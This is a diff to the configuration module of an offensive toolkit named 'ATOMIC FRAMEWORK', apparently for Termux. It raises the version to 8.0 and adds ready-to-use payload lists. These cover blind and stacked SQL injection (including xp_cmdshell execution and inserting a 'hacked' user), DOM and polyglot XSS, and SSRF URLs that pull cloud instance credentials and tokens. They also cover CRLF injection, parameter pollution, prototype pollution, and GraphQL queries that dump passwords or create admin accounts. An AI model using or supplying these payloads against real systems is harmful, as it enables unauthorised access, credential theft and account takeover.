@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ATOMIC FRAMEWORK v7.0 - ULTIMATE EDITION
+ATOMIC FRAMEWORK v8.0 - ULTIMATE EDITION
 Configuration Module - Termux Optimized
 """
 
@@ -12,7 +12,7 @@ class Config:
     """Main Configuration"""
     
     # Version Info
-    VERSION = "7.0-ULTIMATE"
+    VERSION = "8.0-ULTIMATE"
     CODENAME = "PHOENIX"
     AUTHOR = "Atomic Security"
     
@@ -293,6 +293,85 @@ class Payloads:
         'octal': lambda x: ''.join(f'\\{ord(c):03o}' for c in x),
         'base64': lambda x: __import__('base64').b64encode(x.encode()).decode(),
     }
+
+    # Advanced SQLi - Boolean-based blind
+    SQLI_BOOLEAN_BLIND = [
+        "' AND 1=1 --", "' AND 1=2 --",
+        "' AND 'a'='a", "' AND 'a'='b",
+        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
+        "' AND SUBSTRING(version(),1,1)='5' --",
+        "' AND (SELECT LENGTH(database()))>0 --",
+        "' AND ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM information_schema.schemata LIMIT 0,1),1,1))>64 --",
+    ]
+
+    # Advanced SQLi - Stacked queries
+    SQLI_STACKED = [
+        "'; SELECT 1; --",
+        "'; SELECT pg_sleep(5); --",
+        "'; EXEC xp_cmdshell('whoami'); --",
+        "'; DECLARE @q VARCHAR(200)=0x77686f616d69; EXEC(@q); --",
+        "'; INSERT INTO users(username,password) VALUES('hacked','hacked'); --",
+    ]
+
+    # Advanced XSS - DOM-based
+    XSS_DOM_PAYLOADS = [
+        "#<img src=x onerror=alert(1)>",
+        "javascript:alert(document.domain)",
+        "'-alert(1)-'", "\\'-alert(1)//",
+        "</script><script>alert(1)</script>",
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
+        "<svg><script>alert&lpar;1&rpar;</script>",
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)//-->",
+    ]
+
+    # Advanced XSS - Polyglot
+    XSS_POLYGLOT = [
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik;alert(1)//",
+        "'\"-->]]>*/</script></style></noscript></xmp></textarea><img src=x onerror=alert(1)>",
+        "-->'\"\\><img src=x onerror=alert(1)>",
+    ]
+
+    # Advanced SSRF - Cloud metadata
+    SSRF_CLOUD_METADATA = [
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/api/token",
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+        "http://169.254.169.254/metadata/v1.json",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://100.100.100.200/latest/meta-data/",
+        "http://169.254.170.2/v2/credentials",
+    ]
+
+    # CRLF Injection
+    CRLF_PAYLOADS = [
+        "%0d%0aSet-Cookie:crlfinjection=true",
+        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",
+        "\\r\\nX-Injected: header",
+        "%E5%98%8A%E5%98%8DSet-Cookie:crlfinjection=true",
+    ]
+
+    # HTTP Parameter Pollution
+    HPP_PAYLOADS = [
+        "&admin=true", "&role=admin", "&debug=1",
+        "&access=all", "&auth=bypass",
+    ]
+
+    # Prototype Pollution
+    PROTO_POLLUTION = [
+        '{"__proto__":{"isAdmin":true}}',
+        '{"constructor":{"prototype":{"isAdmin":true}}}',
+        '__proto__[isAdmin]=true',
+        'constructor.prototype.isAdmin=true',
+    ]
+
+    # GraphQL Injection
+    GRAPHQL_PAYLOADS = [
+        '{"query":"{__schema{types{name}}}"}',
+        '{"query":"{__type(name:\\"User\\"){name fields{name type{name}}}}"}',
+        '{"query":"query{users{id username password email}}"}',
+        '{"query":"mutation{createUser(username:\\"admin\\",password:\\"admin\\",role:\\"admin\\"){id}}"}',
+    ]
 
 
 class Colors:
